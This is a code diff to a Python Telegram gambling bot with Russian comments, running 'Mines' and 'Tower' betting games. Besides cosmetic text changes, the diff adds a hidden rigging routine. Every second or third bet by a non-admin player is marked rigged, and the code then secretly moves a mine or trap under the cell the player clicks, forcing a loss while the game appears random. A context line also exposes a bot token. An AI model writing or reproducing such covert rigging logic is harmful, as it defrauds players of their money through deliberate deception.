@@ -18,6 +18,9 @@ TOKEN = "8740242990:AAF2I7c7x_SD6-Dww3WQJKQYbk3WsXYP5BI"
 
 dp = Dispatcher()
 
+# Администраторы
+ADMIN_IDS = {7921743592}
+
 # Балансы пользователей (по умолчанию 1.00)
 user_balances = {}
 
@@ -35,6 +38,9 @@ active_tower_games = {}
 
 # Параметры ставок для Башни: user_id -> dict
 tower_game_settings = {}
+
+# Счётчик ставок пользователей (для алгоритма подкрутки)
+user_bets_counter = {}
 
 
 class MinesState(StatesGroup):
@@ -565,7 +571,7 @@ async def menu_handler(message: Message) -> None:
     balance = get_user_balance(user_id)
 
     text = (
-        '<b><tg-emoji emoji-id="5278702045883292456">🛍</tg-emoji> Выберите действие!\n'
+        '<b><tg-emoji emoji-id="5278702045883292456">🛍</tg-emoji> Выберите действие!\n\n'
         f'<tg-emoji emoji-id="5242253527480311898">🪙</tg-emoji> Баланс: </b><code>{balance:.2f}</code><b> <tg-emoji emoji-id="5305445793623218874">💲</tg-emoji></b>'
     )
     await message.answer(
@@ -590,7 +596,7 @@ async def close_profile_handler(call: CallbackQuery) -> None:
     balance = get_user_balance(user_id)
 
     text = (
-        '<b><tg-emoji emoji-id="5278702045883292456">🛍</tg-emoji> Выберите действие!\n'
+        '<b><tg-emoji emoji-id="5278702045883292456">🛍</tg-emoji> Выберите действие!\n\n'
         f'<tg-emoji emoji-id="5242253527480311898">🪙</tg-emoji> Баланс: </b><code>{balance:.2f}</code><b> <tg-emoji emoji-id="5305445793623218874">💲</tg-emoji></b>'
     )
     await safe_edit_message(call, text, menu_inline_keyboard)
@@ -629,7 +635,7 @@ async def play_handler(message: Message) -> None:
     balance = get_user_balance(user_id)
 
     text = (
-        '<b><tg-emoji emoji-id="5309815458990433715">🎮</tg-emoji> Выберите игру для ставки !\n'
+        '<b><tg-emoji emoji-id="5309815458990433715">🎮</tg-emoji> Выберите игру для ставки !\n\n'
         f'<tg-emoji emoji-id="5307942883314147223">🏆</tg-emoji> Баланс : </b><code>{balance:.2f}</code><b> <tg-emoji emoji-id="5305445793623218874">💲</tg-emoji></b>'
     )
     await message.answer(text=text, parse_mode="HTML", reply_markup=games_keyboard)
@@ -648,7 +654,7 @@ async def back_to_games_handler(call: CallbackQuery, state: FSMContext) -> None:
     balance = get_user_balance(user_id)
 
     text = (
-        '<b><tg-emoji emoji-id="5309815458990433715">🎮</tg-emoji> Выберите игру для ставки !\n'
+        '<b><tg-emoji emoji-id="5309815458990433715">🎮</tg-emoji> Выберите игру для ставки !\n\n'
         f'<tg-emoji emoji-id="5307942883314147223">🏆</tg-emoji> Баланс : </b><code>{balance:.2f}</code><b> <tg-emoji emoji-id="5305445793623218874">💲</tg-emoji></b>'
     )
     await safe_edit_message(call, text, games_keyboard)
@@ -801,6 +807,12 @@ async def start_mines_game(call: CallbackQuery) -> None:
     user_balances[user_id] -= bet
     user_turnover[user_id] = get_user_turnover(user_id) + bet
 
+    # Увеличение счетчика ставок пользователя
+    user_bets_counter[user_id] = user_bets_counter.get(user_id, 0) + 1
+    
+    # Режим слива: каждые 2 или 3 ставки не для админов
+    should_rig = (user_id not in ADMIN_IDS) and (user_bets_counter[user_id] % random.choice([2, 3]) == 0)
+
     mines_positions = set(random.sample(range(FIELD_SIZE), mines_count))
 
     game_id = f"{call.message.chat.id}_{call.message.message_id}"
@@ -814,6 +826,7 @@ async def start_mines_game(call: CallbackQuery) -> None:
         "opened": set(),
         "game_over": False,
         "current_win": 0.00,
+        "rigged": should_rig
     }
 
     text = (
@@ -849,6 +862,13 @@ async def open_cell_handler(call: CallbackQuery) -> None:
     if cell_idx in game["opened"]:
         await call.answer()
         return
+
+    # Логика подкрутки слива на первый клик
+    if game.get("rigged") and len(game["opened"]) == 0:
+        if cell_idx not in game["mines_positions"]:
+            # Перемещаем одну из мин под открываемую клетку
+            game["mines_positions"].pop()
+            game["mines_positions"].add(cell_idx)
 
     game["opened"].add(cell_idx)
 
@@ -1083,6 +1103,12 @@ async def start_tower_game(call: CallbackQuery) -> None:
     user_balances[user_id] -= bet
     user_turnover[user_id] = get_user_turnover(user_id) + bet
 
+    # Увеличение счетчика ставок
+    user_bets_counter[user_id] = user_bets_counter.get(user_id, 0) + 1
+    
+    # Режим слива: каждые 2 или 3 ставки не для админов
+    should_rig = (user_id not in ADMIN_IDS) and (user_bets_counter[user_id] % random.choice([2, 3]) == 0)
+
     trap_positions = {}
     for floor in range(TOWER_FLOORS):
         trap_positions[floor] = set(random.sample(range(5), traps_count))
@@ -1099,6 +1125,7 @@ async def start_tower_game(call: CallbackQuery) -> None:
         "history": {},
         "game_over": False,
         "current_win": 0.00,
+        "rigged": should_rig
     }
 
     text = (
@@ -1136,6 +1163,12 @@ async def open_tower_cell_handler(call: CallbackQuery) -> None:
     if floor != game["current_floor"]:
         await call.answer("Открывайте этажи по порядку сверху вниз!", show_alert=True)
         return
+
+    # Логика подкрутки слива в Башне при первой клетке этажа
+    if game.get("rigged"):
+        if col not in game["trap_positions"][floor]:
+            game["trap_positions"][floor].pop()
+            game["trap_positions"][floor].add(col)
 
     traps = game["trap_positions"][floor]
 
@@ -1209,8 +1242,6 @@ async def cashout_tower_handler(call: CallbackQuery) -> None:
 
 
 # --- АДМИН-ПАНЕЛЬ ---
-ADMIN_IDS = {7921743592}
-
 
 class AdminState(StatesGroup):
     waiting_for_add_admin = State()
